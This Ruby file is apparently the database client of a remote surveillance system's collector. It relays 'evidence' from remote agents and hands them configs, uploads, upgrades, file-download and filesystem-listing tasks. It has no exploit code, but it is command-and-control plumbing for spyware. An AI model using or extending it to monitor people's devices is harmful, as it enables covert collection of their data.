#
#  DB layer for REST communication
#

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/cgi'

# system
require 'net/http'
require 'timeout'
require 'thread'
require 'json'

module RCS
module Collector

class DB_rest
  include RCS::Tracer

  # if a method does not reply in X seconds consider db down
  DB_TIMEOUT = 10

  def initialize(host)
    @host, @port = host.split(':')

    # the mutex to avoid race conditions
    @semaphore = Mutex.new

    # the HTTP connection object
    @http = Net::HTTP.new(@host, @port)
    @http.use_ssl = true
    
    # no SSL verify for this connection
    #@http.verify_mode = OpenSSL::SSL::VERIFY_NONE

    # CA certificate to check if the server ssl certificate is valid
    @http.ca_file = Config.instance.file('DB_CERT')

    # our client certificate to send to the server
    @http.cert = OpenSSL::X509::Certificate.new(File.read(Config.instance.file('DB_CERT')))
    
    trace :debug, "Using REST to communicate with #{@host}:#{@port}"
  end

  # generic method invocation
  def rest_call(method, uri, content = nil, headers = {})
    begin
      Timeout::timeout(DB_TIMEOUT) do
        return @semaphore.synchronize do
          # the HTTP headers for the authentication
          full_headers = {'Cookie' => @cookie, 'Connection' => 'Keep-Alive' }
          full_headers.merge! headers if headers.is_a? Hash
          case method
            when 'POST'
              @http.request_post(uri, content, full_headers)
            when 'GET'
              @http.request_get(uri, full_headers)
            #when 'PUT'
            #  @http.request_put(uri, full_headers)
            when 'DELETE'
              @http.delete(uri, full_headers)
          end
        end
      end
    rescue
      # ensure the mutex is unlocked on timeout or errors
      @semaphore.unlock if @semaphore.locked?
      # propagate the exception to the upper layer
      raise
    end
  end

  # timeout exception propagator
  def propagate_error(e)
    # the db is down we have to report it to the upper layer
    # it means that we are not able to talk to the db
    trace :warn, "The DB in not responding: #{e.class} #{e.message}"
    raise
  end


  # log in to the database
  # returns a boolean
  def login(user, pass)
    begin
      # start the http session (needed for keep-alive)
      # see this: http://redmine.ruby-lang.org/issues/4522
      @http.start unless @http.started?
      
      # send the authentication data
      account = {:user => user, :pass => pass}
      resp = @http.request_post('/auth/login', account.to_json, nil)
      # remember the session cookie
      @cookie = resp['Set-Cookie'] unless resp['Set-Cookie'].nil?
      # check that the response is valid JSON
      return JSON.parse(resp.body).class == Hash
    rescue Exception => e
      trace :error, "Error logging in: #{e.class} #{e.message}"
      return false
    end
  end

  def logout
    begin
      rest_call('POST', '/auth/logout', nil)
      return true
    rescue Exception => e
      trace :error, "Error logging out: #{e.class} #{e.message}"
      return false
    end
  end

  def sync_start(session, version, user, device, source, time)
    begin
      content = {:bid => session[:bid],
                 :ident => session[:ident],
                 :instance => session[:instance],
                 :subtype => session[:subtype],
                 :version => version,
                 :user => user,
                 :device => device,
                 :source => source,
                 :sync_time => time}

      rest_call('POST', '/evidence/start', content.to_json)
    rescue
    end
  end

  def sync_timeout(session)
    begin
      content = {:bid => session[:bid], :instance => session[:instance]}
      return rest_call('POST', '/evidence/timeout', content.to_json)
    rescue Exception => e
      trace :error, "Error calling sync_timeout: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def sync_end(session)
    begin
      content = {:bid => session[:bid], :instance => session[:instance]}
      return rest_call('POST', '/evidence/stop', content.to_json)
    rescue Exception => e
      trace :error, "Error calling sync_end: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def send_evidence(instance, evidence)
    begin
      ret = rest_call('POST', "/evidence/#{instance}", evidence)
      
      if ret.kind_of? Net::HTTPSuccess then
        return true
      end

      return false, ret.body
    rescue Exception => e
      trace :error, "Error calling send_evidence: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def status_update(component, remoteip, status, message, disk, cpu, pcpu)
    begin
      content = {:name => component, :address => remoteip, :status => status, :info => message, :disk => disk, :cpu => cpu, :pcpu => pcpu}
      return rest_call('POST', '/status', content.to_json)
    rescue Exception => e
      trace :error, "Error calling status_update: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def agent_signature
    begin
      ret = rest_call('GET', '/signature/agent')
      sign = JSON.parse(ret.body)['value']
      return sign
    rescue Exception => e
      trace :error, "Error calling agent_signature: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def network_signature
    begin
      ret = rest_call('GET', '/signature/network')
      sign = JSON.parse(ret.body)['value']
      return sign
    rescue Exception => e
      trace :error, "Error calling network_signature: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  # used to authenticate the agents
  def factory_keys(ident = '')
    begin
      if ident != '' then
        ret = rest_call('GET', "/agent/factory_keys/#{ident}")
      else
        ret = rest_call('GET', '/agent/factory_keys')
      end
      return JSON.parse(ret.body)
    rescue Exception => e
      trace :error, "Error calling factory_keys: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  # agent identify
  def agent_status(build_id, instance_id, subtype)
    begin
      request = {:ident => build_id, :instance => instance_id, :subtype => subtype}
      ret = rest_call('GET', '/agent/status/?' + CGI.encode_query(request))
      
      return DB::NO_SUCH_AGENT, 0 if ret.kind_of? Net::HTTPNotFound

      status = JSON.parse(ret.body)

      bid = status['_id']

      return DB::DELETED_AGENT, bid if status['deleted'] == true

      case status['status']
        when 'OPEN'
          return DB::ACTIVE_AGENT, bid
        when 'QUEUED'
          return DB::QUEUED_AGENT, bid
        when 'CLOSED'
          return DB::CLOSED_AGENT, bid
      end
    rescue Exception => e
      trace :error, "Error calling agent_status: #{e.class} #{e.message}"
      return DB::UNKNOWN_AGENT, 0
    end
  end

  def new_conf(bid)
    begin
      ret = rest_call('GET', "/agent/config/#{bid}")

      if ret.kind_of? Net::HTTPNotFound then
        return nil
      end

      return ret.body
    rescue Exception => e
      trace :error, "Error calling new_conf: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def activate_conf(bid)
    begin
      return rest_call('DELETE', "/agent/config/#{bid}")
    rescue Exception => e
      trace :error, "Error calling activate_conf: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def new_uploads(bid)
    begin
      ret = rest_call('GET', "/agent/uploads/#{bid}")

      upl = {}
      # parse the results and get the contents of the uploads
      JSON.parse(ret.body).each do |elem|
        request = {:upload => elem['_id']}
        upl[elem['_id']] = {:filename => elem['filename'],
                            :content => rest_call('GET', "/agent/upload/#{bid}?" + CGI.encode_query(request)).body }
        trace :debug, "File retrieved: [#{elem['filename']}] #{upl[elem['_id']][:content].length} bytes"
      end
      
      return upl 
    rescue Exception => e
      trace :error, "Error calling new_uploads: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def del_upload(bid, id)
    begin
      return rest_call('DELETE', "/agent/upload/#{bid}?" + CGI.encode_query({:upload => id}))
    rescue Exception => e
      trace :error, "Error calling del_upload: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def new_upgrades(bid)
    begin
      ret = rest_call('GET', "/agent/upgrades/#{bid}")

      upgr = {}
      # parse the results and get the contents of the uploads
      JSON.parse(ret.body).each do |elem|
        request = {:upgrade => elem['upgrade_id']}
        upgr[elem['upgrade_id']] = {:filename => elem['filename'],
                                    :content => rest_call('GET', "/agent/upgrade/#{bid}?" + CGI.encode_query(request)).body }
        trace :debug, "File retrieved: [#{elem['filename']}] #{upgr[elem['upgrade_id']][:content].length} bytes"
      end

      return upgr
    rescue Exception => e
      trace :error, "Error calling new_upgrades: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def del_upgrade(bid)
    begin
      return rest_call('DELETE', "/agent/upgrade/#{bid}")
    rescue Exception => e
      trace :error, "Error calling del_upgrade: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  # retrieve the download list from db (if any)
  def new_downloads(bid)
    begin
      ret = rest_call('GET', "/agent/downloads/#{bid}")

      down = {}
      # parse the results
      JSON.parse(ret.body).each do |elem|
        down[elem['_id']] = elem['path']
      end
      
      return down
    rescue Exception => e
      trace :error, "Error calling new_downloads: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def del_download(bid, id)
    begin
      return rest_call('DELETE', "/agent/download/#{bid}?" + CGI.encode_query({:download => id}))
    rescue Exception => e
      trace :error, "Error calling del_download: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  # retrieve the filesystem list from db (if any)
  def new_filesystems(bid)
    begin
      ret = rest_call('GET', "/agent/filesystems/#{bid}")

      files = {}
      # parse the results
      JSON.parse(ret.body).each do |elem|
        files[elem['_id']] = {:depth => elem['depth'], :path => elem['path']}
      end
      
      return files
    rescue Exception => e
      trace :error, "Error calling new_filesystems: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def del_filesystem(bid, id)
    begin
      return rest_call('DELETE', "/agent/filesystem/#{bid}?" + CGI.encode_query({:filesystem => id}))
    rescue Exception => e
      trace :error, "Error calling del_filesystem: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def get_proxies
    begin
      ret = rest_call('GET', "/proxy")
      return JSON.parse(ret.body)
    rescue Exception => e
      trace :error, "Error calling get_proxies: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def proxy_set_version(id, version)
    begin
      rest_call('POST', "/proxy/version/#{id}", {:version => version}.to_json)
    rescue Exception => e
      trace :error, "Error calling proxy_set_version: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def proxy_config(id)
    begin
      ret = rest_call('GET', "/proxy/config/#{id}")

      if ret.kind_of? Net::HTTPNotFound then
        return nil
      end

      return ret.body
    rescue Exception => e
      trace :error, "Error calling proxy_config: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def proxy_add_log(id, time, type, desc)
    begin
      log = {:type => type, :time => time, :desc => desc}
      rest_call('POST', "/proxy/log/#{id}", log.to_json)
    rescue Exception => e
      trace :error, "Error calling proxy_add_log: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def get_collectors
    begin
      ret = rest_call('GET', "/collector")
      return JSON.parse(ret.body)
    rescue Exception => e
      trace :error, "Error calling get_collectors: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def collector_set_version(id, version)
    begin
      rest_call('POST', "/collector/version/#{id}", {:version => version}.to_json)
    rescue Exception => e
      trace :error, "Error calling collector_set_version: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def collector_config(id)
    begin
     ret = rest_call('GET', "/collector/config/#{id}")

      if ret.kind_of? Net::HTTPNotFound then
        return nil
      end

      return ret.body
    rescue Exception => e
      trace :error, "Error calling collector_config: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def collector_add_log(id, time, type, desc)
    begin
      log = {:_id => id, :type => type, :time => time, :desc => desc}
      rest_call('POST', "/collector/log", log.to_json)
    rescue Exception => e
      trace :error, "Error calling collector_add_log: #{e.class} #{e.message}"
      propagate_error e
    end
  end

end #

end #Collector::
end #RCS::